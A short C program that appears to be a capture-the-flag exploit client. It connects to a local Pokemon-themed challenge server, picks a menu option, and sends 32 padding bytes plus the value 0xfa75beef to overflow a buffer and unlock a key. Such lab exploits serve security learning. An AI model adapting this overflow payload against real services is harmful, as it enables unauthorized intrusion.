#include <stdio.h>
#include <stdio.h>
#include <strings.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define PORTNO "12346"

#define POKEMON_NUMBER "1\n"        /* Prompt number */

#define POKEMON_OVERWRITE 0xfa75beef  /* The secret value that it must be to get
                                         the key. */

#define TARGET_BUF_LEN 40
#define MAX_SEND_BUFF 100
#define MAX_RECV_BUFF 100

#define DEBUG true

int recv_debug(int fd, int len) {
    char recv_buff[MAX_RECV_BUFF];
    memset(recv_buff, '\0', MAX_RECV_BUFF);
    recv(fd, recv_buff, len, 0);
    printf("** RECV_DEBUG: %s\n", recv_buff);
    fflush(stdout);
}

int main(void)  {

    int sockfd;
    struct addrinfo hints, *res;
    int bytes_sent, bytes_recv = 0;
    char buf[TARGET_BUF_LEN];
    char send_buff[MAX_SEND_BUFF];
    size_t answer_length = 0;
    char padding[100];
    int i;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    getaddrinfo("127.0.0.1", "12346", &hints, &res);

    /* open a socket to the server */
    sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);

    if (connect(sockfd, res->ai_addr, res->ai_addrlen) == -1) {
        perror("Error in connect:");
        exit(-1);
    }
    /* Example crap sent from server

       Do you want to be a?
       1.) Pokemon Master
       2.) Elite Hacker
       3.) The Batman

     */
    /* Server sends its greet, do you wanna be a */
    recv_debug(sockfd, 21);

    /* Pokemon */
    recv_debug(sockfd, 19);

    /* Elite hacker */
    recv_debug(sockfd, 17);

    /* The batman */
    recv_debug(sockfd, 15);

    /* send it that we want to be a pokemon master (1) */
    bytes_sent = send(sockfd, POKEMON_NUMBER, 2, 0);

    /* Server sends another prompt , 44 long, some trash*/
    /* So you want to be the best there ever was? */
    recv_debug(sockfd, 44);

    /* NULL the entire buffer */
    memset(send_buff, '\0', MAX_SEND_BUFF );

    /* Fill it in with the secret */
    for (i = 0 ; i <= 31; i++) {
        send_buff[i] = 'A';
    }

    // 0xfa75beef (better way ?)
    send_buff[32] = 0xef;
    send_buff[33] = 0xbe;
    send_buff[34] = 0x75;
    send_buff[35] = 0xfa;

    #ifdef DEBUG
    for (i=0; i < 40; ++i) {
            printf("%02x ",send_buff[i]);
    }
    printf("\n");
    #endif

    /* send the secret phrase.. */
    bytes_sent = send(sockfd, send_buff, (size_t)i, 0);
    /* this should trip over p=1!*/

    for(i = 0; i < 256; i++) {
        recv_debug(sockfd, 1);
    }

    printf("\n");

    /* Clean up */
    close(sockfd);

    return 0;
}
